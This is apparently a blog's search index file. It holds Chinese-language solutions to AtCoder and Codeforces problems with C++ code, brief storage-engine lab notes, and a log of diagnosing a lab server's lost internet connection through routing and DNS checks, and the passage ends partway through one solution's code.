<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ABC294F Sugar Water 2</title>
      <link href="/2023/03/21/abc294f-sugar-water-2/"/>
      <url>/2023/03/21/abc294f-sugar-water-2/</url>
      
        <content type="html"><![CDATA[<h1 id="ABC294F-Sugar-Water-2"><a href="#ABC294F-Sugar-Water-2" class="headerlink" title="ABC294F Sugar Water 2"></a>ABC294F Sugar Water 2</h1><p><a href="https://atcoder.jp/contests/abc294/tasks/abc294_f">题目链接</a></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>$\frac{100x}{x+y}$是糖的浓度的百分比值，讨论时只考虑$\frac{x}{x+y}$即可，后面再去乘100，待求解的问题本质上就是求$NM$个组合的浓度中第K大。</p><p>直接二分最终的浓度，找到最小的浓度，满足“刚好有K个大于等于该浓度的组合”。</p><p>对于一个二分到的浓度$T$，Takahashi的第$i$杯糖水中有$S_i$克糖和$W_i$克水，如果只要求浓度为$T$，那么他还富余了$(S_i-\frac{T}{1-T}\times W_i)$克糖（推理过程如下），富余的糖就可以给Aoki的糖水使用。<br>$$<br>设有W_i克水，需要x克糖才能使得糖水的浓度为T，则有\<br>T=\frac{x}{x+W_i}\rightarrow \frac{1}{T}=1+\frac{W_i}{x}\rightarrow x=W_i \frac{T}{1-T}\<br>很容易即可推出出Takahashi盈余的糖分为\<br>S_i-W_i \frac{T}{1-T}<br>$$<br>如此，我们得到了一个在$O(nlog\ n)$时间复杂度内计算有多少个大于等于浓度T的组合的方法：</p><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">vector&lt;double&gt; eSuger(N);double tmp &#x3D; T &#x2F; (1 - T);&#x2F;&#x2F; 对于二分到的浓度T，计算将Takahashi的每杯糖水盈余的糖分，保存到vector中for (int i &#x3D; 0; i &lt; N; i++) &#123;    eSuger[i] &#x3D; (double) Ta[i].suger - tmp * Ta[i].water;&#125;&#x2F;&#x2F; 从小到大排序，方便后面用lower_bound函数sort(eSuger.begin(), eSuger.end());LL cnt &#x3D; 0;&#x2F;&#x2F; 枚举Aoki的每杯糖水for (int i &#x3D; 0; i &lt; M; i++) &#123;    &#x2F;&#x2F; 计算这杯糖水需要多少糖分才能使其浓度为T    double nSuger &#x3D; tmp * Ao[i].water - Ao[i].suger;    &#x2F;&#x2F; Takahashi有多少杯糖水可以满足Aoki的这杯糖水所需的糖分&#x2F;&#x2F; 把所有的糖水加起来就是满足“浓度大于等于T”的组合数    cnt +&#x3D; N-(lower_bound(eSuger.begin(),eSuger.end(),nSuger)-eSuger.begin());&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">#include &lt;bits&#x2F;stdc++.h&gt;using namespace std;using LL &#x3D; long long;struct juice &#123;    int suger, water;    juice(int s &#x3D; 0, int w &#x3D; 0) : suger(s), water(w) &#123;&#125;&#125;;int main() &#123;&#x2F;&#x2F;    freopen(&quot;in.txt&quot;,&quot;r&quot;,stdin);&#x2F;&#x2F;    freopen(&quot;out.txt&quot;,&quot;w&quot;,stdout);    int N, M;    LL K;    cin &gt;&gt; N &gt;&gt; M &gt;&gt; K;    int a, b;    vector&lt;juice&gt; Ta, Ao;    for (int i &#x3D; 0; i &lt; N; i++) &#123;        cin &gt;&gt; a &gt;&gt; b;        Ta.push_back(juice(a, b));    &#125;    for (int i &#x3D; 0; i &lt; M; i++) &#123;        cin &gt;&gt; a &gt;&gt; b;        Ao.push_back(juice(a, b));    &#125;    double l &#x3D; 0, r &#x3D; 1;    int t &#x3D; 100;    vector&lt;double&gt; eSuger(N);    while (t--) &#123;        double C &#x3D; (l + r) &#x2F; 2;        double tmp &#x3D; C &#x2F; (1 - C);        for (int i &#x3D; 0; i &lt; N; i++) &#123;            eSuger[i] &#x3D; (double) Ta[i].suger - tmp * Ta[i].water;        &#125;        sort(eSuger.begin(), eSuger.end());        LL cnt &#x3D; 0;        for (int i &#x3D; 0; i &lt; M; i++) &#123;            double nSuger &#x3D; tmp * Ao[i].water - Ao[i].suger;            cnt +&#x3D; N - (lower_bound(eSuger.begin(), eSuger.end(), nSuger) - eSuger.begin());        &#125;        &#x2F;&#x2F; 看题解学到的新写法        (cnt &lt; K ? r : l) &#x3D; C;    &#125;    cout &lt;&lt; fixed &lt;&lt; setprecision(16) &lt;&lt; l * 100 &lt;&lt; endl;    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 二分 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tiny-KV 文档</title>
      <link href="/2023/01/20/tiny-kv-wen-dang/"/>
      <url>/2023/01/20/tiny-kv-wen-dang/</url>
      
        <content type="html"><![CDATA[<h1 id="未命名"><a href="#未命名" class="headerlink" title="未命名"></a>未命名</h1><h2 id="Lab-1"><a href="#Lab-1" class="headerlink" title="Lab 1"></a>Lab 1</h2><h4 id="column-family"><a href="#column-family" class="headerlink" title="column family"></a>column family</h4><p><a href="https://en.wikipedia.org/wiki/Standard_column_family">wiki</a></p><p><a href="https://stackoverflow.com/questions/3245267/column-family-concept-and-data-model">stackoverflow</a></p><h4 id="Implement-standalone-storage-engine"><a href="#Implement-standalone-storage-engine" class="headerlink" title="Implement standalone storage engine"></a>Implement standalone storage engine</h4><h4 id="Implement-service-handlers"><a href="#Implement-service-handlers" class="headerlink" title="Implement service handlers"></a>Implement service handlers</h4>]]></content>
      
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>etcd源码阅读笔记</title>
      <link href="/2023/01/06/etcd-yuan-ma-yue-du-bi-ji/"/>
      <url>/2023/01/06/etcd-yuan-ma-yue-du-bi-ji/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 粗糙笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决&#39;服务器无法连接外网&#39;问题的过程记录</title>
      <link href="/2023/01/03/jie-jue-fu-wu-qi-wu-fa-lian-jie-wai-wang-wen-ti-de-guo-cheng-ji-lu/"/>
      <url>/2023/01/03/jie-jue-fu-wu-qi-wu-fa-lian-jie-wai-wang-wen-ti-de-guo-cheng-ji-lu/</url>
      
        <content type="html"><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>最近几天发现实验室的服务器无法连接外网，ping不通，无法git clone代码等等。每天花一点时间尝试排查一下问题出在哪里，看看怎么解决。</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><ol><li><p><code>ifconfig</code> 看一下信息。可以看到：平时ssh连接的网卡是ens192，它的内网IP是172.17.172.192，运行状态好像没什么问题；ens160的内网IP是169.254.8.98，好像有问题，本地没办法ping通；</p><pre class="line-numbers language-none"><code class="language-none">$ ifconfigdocker0: flags&#x3D;4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 172.18.0.1  netmask 255.255.0.0  broadcast 172.18.255.255        inet6 fe80::42:50ff:fe64:4e73  prefixlen 64  scopeid 0x20&lt;link&gt;        ether 02:42:50:64:4e:73  txqueuelen 0  (Ethernet)        RX packets 178670  bytes 144916517 (144.9 MB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 3362197  bytes 340061285 (340.0 MB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0ens160: flags&#x3D;4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet6 fc00:7934:ba68:1:453f:626d:245b:93e8  prefixlen 64  scopeid 0x0&lt;global&gt;        inet6 fc00:7934:ba68:1:fa5b:3156:d9d2:37e0  prefixlen 64  scopeid 0x0&lt;global&gt;        inet6 fc00:7934:ba68:1:4e07:d3e:9f21:eea4  prefixlen 64  scopeid 0x0&lt;global&gt;        inet6 fc00:7934:ba68:1:6137:f06e:9597:d985  prefixlen 64  scopeid 0x0&lt;global&gt;        inet6 fe80::c8b7:129e:b125:6a28  prefixlen 64  scopeid 0x20&lt;link&gt;        inet6 fc00:7934:ba68:1:242d:4fe9:2c0c:cd2f  prefixlen 64  scopeid 0x0&lt;global&gt;        inet6 fc00:7934:ba68:1:808c:f4a7:b0eb:bf63  prefixlen 64  scopeid 0x0&lt;global&gt;        inet6 fc00:7934:ba68:1:6d60:5c0:d8e4:d9cb  prefixlen 64  scopeid 0x0&lt;global&gt;        inet6 fc00:7934:ba68:1:a6b:d8f7:cf36:9130  prefixlen 64  scopeid 0x0&lt;global&gt;        inet6 fc00:7934:ba68:1:f654:1fe0:9220:daa1  prefixlen 64  scopeid 0x0&lt;global&gt;        ether 00:0c:29:80:36:ef  txqueuelen 1000  (Ethernet)        RX packets 20356000  bytes 7320601513 (7.3 GB)        RX errors 0  dropped 693  overruns 0  frame 0        TX packets 25632830  bytes 3912930954 (3.9 GB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0ens192: flags&#x3D;4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 172.17.172.192  netmask 255.255.248.0  broadcast 172.17.175.255        inet6 2001:250:6803:206:8ec4:af17:22a0:204c  prefixlen 64  scopeid 0x0&lt;global&gt;        inet6 2001:250:6803:206:1b61:1818:9181:3833  prefixlen 64  scopeid 0x0&lt;global&gt;        inet6 2001:250:6803:206:8b33:c189:6e29:a038  prefixlen 64  scopeid 0x0&lt;global&gt;        inet6 2001:250:6803:206:2381:b202:cd4d:c781  prefixlen 64  scopeid 0x0&lt;global&gt;        inet6 2001:250:6803:206:81ad:159d:f8bb:6893  prefixlen 64  scopeid 0x0&lt;global&gt;        inet6 2001:250:6803:206:5a18:1bd3:8525:f532  prefixlen 64  scopeid 0x0&lt;global&gt;        inet6 2001:250:6803:206:744f:830a:46fd:2cc9  prefixlen 64  scopeid 0x0&lt;global&gt;        inet6 2001:250:6803:206:cf03:ab8a:585:5810  prefixlen 64  scopeid 0x0&lt;global&gt;        inet6 fe80::2f79:480e:1041:4000  prefixlen 64  scopeid 0x20&lt;link&gt;        inet6 2001:250:6803:206:8a4a:e39e:ee42:d311  prefixlen 64  scopeid 0x0&lt;global&gt;        ether 00:0c:29:80:36:f9  txqueuelen 1000  (Ethernet)        RX packets 50603025  bytes 9110805500 (9.1 GB)        RX errors 0  dropped 703  overruns 0  frame 0        TX packets 29180189  bytes 18701212188 (18.7 GB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0ens160:avahi: flags&#x3D;4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 169.254.8.98  netmask 255.255.0.0  broadcast 169.254.255.255        ether 00:0c:29:80:36:ef  txqueuelen 1000  (Ethernet)lo: flags&#x3D;73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536        inet 127.0.0.1  netmask 255.0.0.0        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;        loop  txqueuelen 1000  (Local Loopback)        RX packets 8260572  bytes 1759584719 (1.7 GB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 8260572  bytes 1759584719 (1.7 GB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0vethabaa764: flags&#x3D;4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet6 fe80::f013:f5ff:fe7b:9d43  prefixlen 64  scopeid 0x20&lt;link&gt;        ether f2:13:f5:7b:9d:43  txqueuelen 0  (Ethernet)        RX packets 178663  bytes 147417543 (147.4 MB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 2162158  bytes 290116295 (290.1 MB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0zt44xh4rxy: flags&#x3D;4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 2800        inet 192.168.192.124  netmask 255.255.255.0  broadcast 192.168.192.255        inet6 fe80::9465:3eff:fee1:a8cc  prefixlen 64  scopeid 0x20&lt;link&gt;        ether 96:65:3e:e1:a8:cc  txqueuelen 1000  (Ethernet)        RX packets 119243  bytes 13381700 (13.3 MB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 2653  bytes 229946 (229.9 KB)        TX errors 0  dropped 6632 overruns 0  carrier 0  collisions 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>route</code> 看一下路由表。路由表好像有点问题，172.17.168.1是什么IP？</p><pre class="line-numbers language-none"><code class="language-none">$ route -nKernel IP routing tableDestination     Gateway         Genmask         Flags Metric Ref    Use Iface0.0.0.0         172.17.168.1    0.0.0.0         UG    0      0        0 ens1920.0.0.0         0.0.0.0         0.0.0.0         U     1002   0        0 ens1600.0.0.0         172.17.168.1    0.0.0.0         UG    20101  0        0 ens192169.254.0.0     0.0.0.0         255.255.0.0     U     0      0        0 ens160172.17.168.0    0.0.0.0         255.255.248.0   U     101    0        0 ens192172.18.0.0      0.0.0.0         255.255.0.0     U     0      0        0 docker0192.168.192.0   0.0.0.0         255.255.255.0   U     0      0        0 zt44xh4rxy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>先尝试把ens192的IP加到路由表里面。</p><pre class="line-numbers language-none"><code class="language-none">$ sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 172.17.172.1$ route -nKernel IP routing tableDestination     Gateway         Genmask         Flags Metric Ref    Use Iface0.0.0.0         172.17.172.1    0.0.0.0         UG    0      0        0 ens1920.0.0.0         172.17.168.1    0.0.0.0         UG    0      0        0 ens1920.0.0.0         0.0.0.0         0.0.0.0         U     1002   0        0 ens1600.0.0.0         172.17.168.1    0.0.0.0         UG    20101  0        0 ens192169.254.0.0     0.0.0.0         255.255.0.0     U     0      0        0 ens160172.17.168.0    0.0.0.0         255.255.248.0   U     101    0        0 ens192172.18.0.0      0.0.0.0         255.255.0.0     U     0      0        0 docker0192.168.192.0   0.0.0.0         255.255.255.0   U     0      0        0 zt44xh4rxy$ ping www.baidu.comping: www.baidu.com: Temporary failure in name resolution<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>“Temporary failure in name resolution”，是不是DNS解析的问题？尝试修改DNS服务器配置。网上常见的教程就是修改<code>/etc/resolv.conf</code>，但是打开这个文件发现第一行就写着 “Do not edit.”</p><pre class="line-numbers language-none"><code class="language-none"># This file is managed by man:systemd-resolved(8). Do not edit.## This is a dynamic resolv.conf file for connecting local clients to the# internal DNS stub resolver of systemd-resolved. This file lists all# configured search domains.## Run &quot;resolvectl status&quot; to see details about the uplink DNS servers# currently in use.## Third party programs must not access this file directly, but only through the# symlink at &#x2F;etc&#x2F;resolv.conf. To manage man:resolv.conf(5) in a different way,# replace this symlink by a static file or a different symlink.## See man:systemd-resolved.service(8) for details about the supported modes of# operation for &#x2F;etc&#x2F;resolv.conf.nameserver 127.0.0.53options edns0 trust-ad<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>按照文件中的指示，<code>resolvectl status</code>：</p><pre class="line-numbers language-none"><code class="language-none">......Link 3 (ens192)      Current Scopes: DNS            DefaultRoute setting: yes                   LLMNR setting: yes            MulticastDNS setting: no               DNSOverTLS setting: no                   DNSSEC setting: no                 DNSSEC supported: no                      DNS Servers: 210.34.48.59                         218.104.128.106                      218.85.157.99            DNS Domain: ~.......<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这3个DNS Server都ping不通啊。现在有点怀疑会不会真是没有网了。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 粗糙笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CF1721D Maximum AND</title>
      <link href="/2022/09/08/cf1721d-maximum-and/"/>
      <url>/2022/09/08/cf1721d-maximum-and/</url>
      
        <content type="html"><![CDATA[<h1 id="CF1706D-Maximum-AND"><a href="#CF1706D-Maximum-AND" class="headerlink" title="CF1706D Maximum AND"></a>CF1706D Maximum AND</h1><p><a href="https://codeforces.com/contest/1721/problem/D">题目链接</a></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ul><li><p>第一步是先考虑写一个 <code>check()</code> 函数，验证答案 <code>ans</code> 是否成立。用一个 <code>map</code>，类似找匹配那样暴力求解即可：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">bool check(int ans)&#123;map&lt;int, int&gt; rec;for (int i &#x3D; 0; i&lt;n; i++) &#123;int tmp &#x3D; b[i] &amp; ans;rec[tmp]++;&#125;for (int i &#x3D; 0; i&lt;n; i++) &#123;int tmp &#x3D; (a[i] &amp; ans) ^ ans;if (rec.count(tmp) &amp;&amp; rec[tmp]&gt;0) &#123;rec[tmp]--;&#125;else &#123;return false;&#125;&#125;return true;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>注意，这道题没办法二分。故采取一种贪心的做法：从最高位开始遍历，若目前已知的 <code>ans</code> 加上该位上的值所得到的新 <code>ans</code> 成立，则把这个值加上去。遍历完之后，<code>ans</code> 即为所求的最大值。</p></li></ul><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;bits&#x2F;stdc++.h&gt;using namespace std;const int MAXN &#x3D; 1e5 + 5;using LL &#x3D; long long;int n;array&lt;int, MAXN&gt; a, b;bool check(int ans)&#123;map&lt;int, int&gt; rec;for (int i &#x3D; 0; i&lt;n; i++) &#123;int tmp &#x3D; b[i] &amp; ans;rec[tmp]++;&#125;for (int i &#x3D; 0; i&lt;n; i++) &#123;int tmp &#x3D; (a[i] &amp; ans) ^ ans;if (rec.count(tmp) &amp;&amp; rec[tmp]&gt;0) &#123;rec[tmp]--;&#125;else &#123;return false;&#125;&#125;return true;&#125;int main()&#123;ios::sync_with_stdio(false);cin.tie(0);&#x2F;&#x2F;    freopen(&quot;in.txt&quot;, &quot;r&quot;, stdin);int T;cin &gt;&gt; T;while (T--) &#123;cin &gt;&gt; n;for (int i &#x3D; 0; i&lt;n; i++) &#123;cin &gt;&gt; a[i];&#125;for (int i &#x3D; 0; i&lt;n; i++) &#123;cin &gt;&gt; b[i];&#125;int ans &#x3D; 0;for (int i &#x3D; (1 &lt;&lt; 29); i&gt;&#x3D;1; i &#x2F;&#x3D; 2) &#123;if (check(ans+i)) &#123;ans +&#x3D; i;&#125;&#125;cout &lt;&lt; ans &lt;&lt; endl;&#125;return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 暴力 </tag>
            
            <tag> 贪心 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CF1706D Chopping Carrots</title>
      <link href="/2022/07/22/cf1706d-chopping-carrots/"/>
      <url>/2022/07/22/cf1706d-chopping-carrots/</url>
      
        <content type="html"><![CDATA[<h1 id="CF1706D-Chopping-Carrots"><a href="#CF1706D-Chopping-Carrots" class="headerlink" title="CF1706D Chopping Carrots"></a>CF1706D Chopping Carrots</h1><h2 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h2><p>给定一个长度为 $n$ 的不严格递增数列 $a_1,a_2,…,a_n$ 和一个整数 $k$。</p><p>对于一个数列 $p_1,p_2,…,p_n$，定义其 cost 等于：<br>$$<br>\mathop{max}\limits_{1 \le i \le n} (\lfloor \frac{a_i}{p_i} \rfloor) - \mathop{min}\limits_{1 \le i \le n} (\lfloor \frac{a_i}{p_i} \rfloor)<br>$$<br>求对于任意数据范围内的数列 $p$，所能得到的最小 cost。</p><p>数据范围：</p><p><a href="https://codeforces.com/contest/1706/problem/D1">Easy Version</a>：$1 \le t \le 100(test\ case), 1 \le n,k \le 3000, 1 \le a_1 \le a_2 \le … \le a_n \le 3000$</p><p><a href="https://codeforces.com/contest/1706/problem/D2">Hard Version</a>：$1 \le t \le 100(test\ case), 1 \le n,k \le 3000, 1 \le a_1 \le a_2 \le … \le a_n \le 3000$</p><h2 id="已知结论"><a href="#已知结论" class="headerlink" title="已知结论"></a>已知结论</h2><ol><li>$\lfloor \frac{A}{X} \rfloor \ge B \Leftrightarrow \frac{A}{X} \ge B \Leftrightarrow \frac{A}{B} \ge X \Leftrightarrow \lfloor \frac{A}{B} \rfloor \ge X$</li></ol><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="Easy-Version"><a href="#Easy-Version" class="headerlink" title="Easy Version"></a>Easy Version</h3><ol><li>设 $mi = \mathop{min}\limits_{1 \le i \le n} (\lfloor \frac{a_i}{p_i} \rfloor)$，枚举 $mi$，由于数列中的最小值为 $a_1$，故 $0 \le mi \le a_1$；</li><li>遍历 $a_1,a_2,…,a_n$，要在满足 $\lfloor \frac{a_i}{p_i} \rfloor \ge mi$ 的前提下使得 $p_i$ 尽可能大，这样 $\mathop{max}\limits_{1 \le i \le n} (\lfloor \frac{a_i}{p_i} \rfloor)$ 会尽可能小。根据结论 1 可知：$p_i$ 的最大值是 $\lfloor \frac{a_i}{mi} \rfloor$（$A$ 代入 $a_i$，$B$ 代入 $mi$，$X$ 代入 $p_i$）；</li><li>如此 $O(a_1n)$ 遍历即可得出答案。</li></ol><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><h3 id="Easy-Version-1"><a href="#Easy-Version-1" class="headerlink" title="Easy Version"></a>Easy Version</h3><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">#include &lt;bits&#x2F;stdc++.h&gt;using namespace std;typedef long long LL;const int MAXN &#x3D; 1e5+5; int a[MAXN];int main()&#123;    &#x2F;&#x2F; freopen(&quot;in.txt&quot;, &quot;r&quot;, stdin);    int t;    scanf(&quot;%d&quot;,&amp;t);    while(t--)&#123;        int n,k;        scanf(&quot;%d%d&quot;,&amp;n,&amp;k);        for(int i&#x3D;1;i&lt;&#x3D;n;i++)            scanf(&quot;%d&quot;,&amp;a[i]);        int ans&#x3D;100000;        if(a[1]&#x2F;k&#x3D;&#x3D;0)&#123;            ans&#x3D;min(ans,a[n]&#x2F;k);        &#125;        for(int mi&#x3D;1;mi&lt;&#x3D;a[1];mi++)&#123;            bool flag&#x3D;0;            int tm&#x3D;0;            for(int i&#x3D;1;i&lt;&#x3D;n;i++)&#123;                int p&#x3D;min(a[i]&#x2F;mi,k);                if(a[i]&#x2F;p&#x3D;&#x3D;mi)                    flag&#x3D;true;                tm&#x3D;max(tm,a[i]&#x2F;p);            &#125;            if(flag)                ans&#x3D;min(ans,tm-mi);        &#125;        printf(&quot;%d\n&quot;,ans);    &#125;     return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CF1656E Equal Tree Sums</title>
      <link href="/2022/04/07/cf1656e-equal-tree-sums/"/>
      <url>/2022/04/07/cf1656e-equal-tree-sums/</url>
      
        <content type="html"><![CDATA[<h1 id="CF1656E-Equal-Tree-Sums"><a href="#CF1656E-Equal-Tree-Sums" class="headerlink" title="CF1656E Equal Tree Sums"></a>CF1656E Equal Tree Sums</h1><p><a href="https://codeforces.com/contest/1656/problem/E">题目链接</a></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ol><li>对树进行二分染色( $color = 0/1$ )</li><li>对于结点 $u$，若 $color(u)=0$，则将其赋值为 $deg(u)$；否则赋值为 $-deg(u)$。（$deg(u)$ 代表结点 $u$ 的度数）</li><li>结论：经过步骤 2，树上各结点权值和为 0。<br>证明：对于任意一个 $color=0$ 的结点 $u$，其权值  $deg(u)$ 来自于与其直接相连的 $deg(u)$ 个 $color=1$ 的结点（注意：$color=1$ 的结点权值为负）。而且，结点 $u$ 也为直接相连的 $deg(u)$ 个结点的权值各自贡献 $-1$。即结点 $u$ 本身的权值正好抵消掉它给相邻结点贡献的权值。同理可证：对于任意一个 $color=1$ 的结点也有相同的结论。综上，经过步骤 2，树上各结点权值和为0。</li><li>进一步深究结论 3：删除结点 $u$ 后，与 $u$ 直接连接的结点各自属于一颗子树。此时结点 $u$ 本身的权值 $deg(u)$ 没有了，但是它对相邻结点的影响却没有删除（即各自 $-1$）。若不考虑结点 $u$ 的影响，由结论 3 可知：与 $u$ 直接连接的结点各自所在的子树的权值和为 0，现由于结点 $u$ 给每一颗子树都 $-1$，故各子树的权值和为 $-1$。</li></ol><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;bits/stdc++.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">long</span> <span class="token keyword">long</span> LL<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> MAXN <span class="token operator">=</span> <span class="token number">1e5</span><span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">;</span>array<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> MAXN<span class="token operator">></span> ans<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> G<span class="token punctuation">[</span>MAXN<span class="token punctuation">]</span><span class="token punctuation">;</span>array<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token punctuation">,</span> MAXN<span class="token operator">></span> vis<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> now<span class="token punctuation">,</span> <span class="token keyword">int</span> color<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>color<span class="token punctuation">)</span>        ans<span class="token punctuation">[</span>now<span class="token punctuation">]</span> <span class="token operator">=</span> G<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        ans<span class="token punctuation">[</span>now<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span>G<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    vis<span class="token punctuation">[</span>now<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> v<span class="token operator">:</span> G<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>vis<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token 